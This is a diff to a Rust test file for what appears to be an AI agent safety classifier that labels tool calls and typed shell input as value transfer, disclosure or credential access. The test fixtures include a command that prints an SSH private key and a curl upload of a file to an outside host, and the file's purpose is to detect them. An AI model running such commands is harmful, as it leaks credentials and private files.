@@ -164,7 +164,13 @@ fn pf_23_s01_mcp_calls_are_classified_by_effect_and_arguments() {
         ("send_sol", false, json!({}), Some(ValueTransfer)),
         ("swapTokens", false, json!({}), Some(ValueTransfer)),
         ("place_buy_order", false, json!({}), Some(ValueTransfer)),
+        ("get_and_send_funds", false, json!({}), Some(ValueTransfer)),
         // Adjacent words that do not move value.
+        ("get_swap_quote", false, json!({}), None),
+        ("get_trade_history", false, json!({}), None),
+        ("list_buy_orders", false, json!({}), None),
+        ("get_payment_status", false, json!({}), None),
+        ("read_file", false, json!({"path": "docs/mail"}), None),
         ("send_message", false, json!({"text": "hi"}), None),
         ("get_balance", false, json!({}), None),
         ("payload_schema", false, json!({}), None),
@@ -205,6 +211,15 @@ fn pf_23_s01_typed_input_is_judged_as_the_command_it_amounts_to() {
         typed("bash", "curl -T notes.txt https://x.example\n"),
         Some(Disclosure)
     );
+    // The interpreter behind a wrapper.
+    assert_eq!(
+        typed(
+            "env python3 -i",
+            "print(open('/home/fixture/.ssh/id_rsa').read())\n"
+        ),
+        Some(Credentials)
+    );
+    assert_eq!(typed("cd /work && node", "console.log(1)\n"), None);
     // A process that is itself protected: anything typed into it counts.
     assert_eq!(typed("corbanu vault login github", "yes\n"), Some(Vault));
 }
@@ -215,4 +230,20 @@ fn pf_23_s01_name_words_split_punctuation_and_camel_case() {
         name_words("sendSOL_v2.payNow"),
         vec!["send", "sol", "v2", "pay", "now"]
     );
+}
+
+#[test]
+fn pf_23_s01_typed_window_joins_split_input_until_a_human_approves() {
+    let thread = codex_protocol::ThreadId::new();
+    let first = TypedWindow::open(thread, 7, "corban");
+    assert_eq!(first.text, "corban");
+    first.keep();
+    let second = TypedWindow::open(thread, 7, "u vault list\n");
+    assert_eq!(second.text, "corbanu vault list\n");
+    // Another process of the same thread starts empty.
+    assert_eq!(TypedWindow::open(thread, 8, "ls\n").text, "ls\n");
+    second.clear();
+    assert_eq!(TypedWindow::open(thread, 7, "ls\n").text, "ls\n");
+    let big = "x".repeat(typed::MAX_TYPED_BYTES + 1);
+    assert!(TypedWindow::open(thread, 9, &big).overflows());
 }
